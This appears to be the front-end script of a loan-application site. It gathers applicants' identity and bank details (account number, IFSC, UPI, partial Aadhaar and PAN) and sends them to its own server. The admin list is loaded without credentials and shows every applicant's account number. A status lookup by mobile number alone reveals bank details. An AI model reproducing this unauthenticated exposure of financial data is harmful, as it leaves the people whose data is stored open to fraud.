"use strict";

const API_BASE = "https://reliance-finance.onrender.com";

function getValue(id) {
  const element = document.getElementById(id);
  return element ? element.value.trim() : "";
}

function setMessage(message, type = "success") {
  const element = document.getElementById("adminMessage");

  if (element) {
    element.textContent = message;
    element.style.color = type === "error" ? "#dc2626" : "#15803d";
  } else {
    const result = document.getElementById("statusResult");
    if (result) result.textContent = message;
  }
}

function formatMoney(value) {
  const amount = Number(value);
  if (!Number.isFinite(amount)) return "₹0";
  return "₹" + amount.toLocaleString("en-IN");
}

function addRow(container, label, value) {
  const row = document.createElement("p");
  const strong = document.createElement("strong");

  strong.textContent = label + ": ";
  row.appendChild(strong);
  row.appendChild(
    document.createTextNode(
      value === undefined || value === null || value === ""
        ? "—"
        : String(value)
    )
  );

  container.appendChild(row);
}

function resetForm() {
  const form = document.getElementById("customerForm");
  if (form) form.reset();
}

// 1. डेटा सबमिट करने के लिए
async function handleCustomerSubmit(event) {
  event.preventDefault();

  const name = getValue("customerName");
  const mobile = getValue("mobileNumber");
  const loanType = getValue("loanType");
  const loanAmount = getValue("loanAmount");
  const percentageText = getValue("percentage");
  const percentage = percentageText === "" ? 0 : Number(percentageText);

  if (!name) {
    setMessage("कृपया ग्राहक का नाम भरें।", "error");
    return;
  }

  if (!/^\d{10}$/.test(mobile)) {
    setMessage("मोबाइल नंबर 10 अंकों का होना चाहिए।", "error");
    return;
  }

  if (!loanType) {
    setMessage("कृपया Loan Type चुनें।", "error");
    return;
  }

  const customerData = {
    name: name,
    fullName: name,
    mobile: mobile,
    loanType: loanType,
    loanAmount: loanAmount,
    aadhaarLast4: getValue("aadhaarLast4"),
    panLast4: getValue("panLast4"),
    returnYear: getValue("returnYear"),
    charge: getValue("charge"),
    chargeAmount: getValue("chargeAmount"),
    percentage: percentage,
    bankName: getValue("bankName"),
    accountHolderName: getValue("accountHolderName"),
    accountNumber: getValue("accountNumber"),
    ifscCode: getValue("ifscCode"),
    upiId: getValue("upiNumber"),
    status: "Pending"
  };

  try {
    setMessage("डेटा सेव हो रहा है...");

    const response = await fetch(API_BASE + "/submit-application", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(customerData)
    });

    const result = await response.json();

    if (!response.ok || result.success === false) {
      throw new Error(result.message || "डेटा सेव करने में विफल।");
    }

    loadCustomers();
    resetForm();
    setMessage("रिकॉर्ड सफलतापूर्वक सर्वर पर सेव हो गया!");
  } catch (error) {
    console.error("Save error:", error);
    setMessage("रिकॉर्ड सेव नहीं हुआ। कृपया सर्वर कनेक्शन जाँचें।", "error");
  }
}

// 2. एडमिन लिस्ट लोड करने के लिए (बिना credentials के)
async function loadCustomers() {
  const list = document.getElementById("customerList");
  if (!list) return;

  list.replaceChildren();

  try {
    const response = await fetch(API_BASE + "/applications", {
      method: "GET"
    });

    if (!response.ok) return;

    const customers = await response.json();

    if (!Array.isArray(customers) || customers.length === 0) {
      const empty = document.createElement("p");
      empty.textContent = "अभी कोई रिकॉर्ड उपलब्ध नहीं है।";
      list.appendChild(empty);
      return;
    }

    customers.forEach(customer => {
      const card = document.createElement("div");
      card.className = "customer-card";
      card.style.border = "1px solid #ddd";
      card.style.padding = "15px";
      card.style.margin = "10px 0";
      card.style.borderRadius = "8px";

      addRow(card, "नाम", customer.name || customer.fullName);
      addRow(card, "मोबाइल", customer.mobile);
      addRow(card, "Loan Type", customer.loanType);
      addRow(card, "लोन राशि", formatMoney(customer.loanAmount));
      addRow(card, "स्टेटस", customer.status || "Pending");
      addRow(card, "Application Progress", (customer.percentage || 0) + "%");
      addRow(card, "अकाउंट नंबर", customer.accountNumber);
      addRow(card, "UPI ID", customer.upiId);

      list.appendChild(card);
    });
  } catch (error) {
    console.error("Load customers error:", error);
  }
}

// 3. चेक स्टेटस के लिए
async function checkStatus() {
  const mobileInput = document.getElementById("mobileNumber");
  const result = document.getElementById("statusResult");

  if (!mobileInput || !result) return;

  const mobile = mobileInput.value.trim();
  result.replaceChildren();

  if (!/^\d{10}$/.test(mobile)) {
    result.textContent = "कृपया सही 10 अंकों का मोबाइल नंबर डालें।";
    return;
  }

  result.textContent = "जानकारी लोड हो रही है...";

  try {
    const [appRes, accRes] = await Promise.all([
      fetch(API_BASE + "/check-application?mobile=" + encodeURIComponent(mobile)),
      fetch(API_BASE + "/account-details").catch(() => null)
    ]);

    const data = await appRes.json();

    if (!appRes.ok || data.success === false || !data.application) {
      result.textContent = "इस मोबाइल नंबर से कोई आवेदन नहीं मिला।";
      return;
    }

    let customer = data.application;

    if (accRes && accRes.ok) {
      const accData = await accRes.json();
      const details = accData.accountDetails || accData.data || accData;
      if (details) {
        customer = Object.assign({}, details, customer);
      }
    }

    result.replaceChildren();

    const card = document.createElement("div");
    card.className = "status-card";
    card.style.border = "1px solid #ddd";
    card.style.padding = "20px";
    card.style.borderRadius = "10px";
    card.style.marginTop = "15px";
    card.style.background = "#fff";

    addRow(card, "आवेदक का नाम", customer.name || customer.fullName);
    addRow(card, "Application ID", customer.applicationId || "—");
    addRow(card, "Loan Type", customer.loanType || "—");
    addRow(card, "आवेदन का स्टेटस", customer.status || "Pending");
    addRow(card, "Application Progress", (customer.percentage || 0) + "%");
    addRow(card, "लोन राशि", formatMoney(customer.loanAmount));
    addRow(card, "बैंक का नाम", customer.bankName);
    addRow(card, "खाताधारक का नाम", customer.accountHolderName);
    addRow(card, "अकाउंट नंबर", customer.accountNumber);
    addRow(card, "IFSC कोड", customer.ifscCode);
    addRow(card, "UPI ID", customer.upiId || customer.upiNumber);

    result.appendChild(card);
  } catch (error) {
    console.error("Check status error:", error);
    result.textContent = "सर्वर से संपर्क नहीं हो सका। कृपया बाद में कोशिश करें।";
  }
}

window.checkStatus = checkStatus;

function initializeScript() {
  const form = document.getElementById("customerForm");
  if (form) {
    form.addEventListener("submit", handleCustomerSubmit);
  }
  loadCustomers();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initializeScript);
} else {
  initializeScript();
}
